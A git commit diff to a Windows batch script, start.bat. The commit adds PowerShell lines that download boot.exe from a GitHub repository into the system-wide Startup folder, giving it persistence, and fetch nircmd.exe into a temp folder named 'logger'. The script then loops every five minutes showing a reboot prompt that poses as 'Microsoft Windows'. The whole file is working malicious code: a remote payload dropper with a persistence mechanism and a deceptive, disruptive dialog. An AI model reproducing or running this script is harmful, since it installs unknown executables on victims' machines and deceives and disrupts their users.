16886308bca04a87b4cef4e25ac2885ef85d5358
TheBetaBiggie <53587460+TheBetaBiggie@users.noreply.github.com>
2022-08-24 03:02:00 -0700

    Update start.bat

--- start.bat
+++ start.bat
@@ -1,6 +1,7 @@
 @echo off
-powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/boot.exe -OutFile C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\boot.exe
+powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/boot.exe -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\boot.exe"
+powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/nircmd.exe -OutFile %temp%\logger\nircmd.exe
 :rebootpls
 timeout 300
-nircmd.exe qboxcom "Do you want to reboot? Make sure you save everything you have open. (This prompt will disappear after reboot.)" "Microsoft Windows" exitwin reboot
+%temp%\logger\nircmd.exe qboxcom "Do you want to reboot? Make sure you save everything you have open. (This prompt will disappear after reboot.)" "Microsoft Windows" exitwin reboot
 goto rebootpls
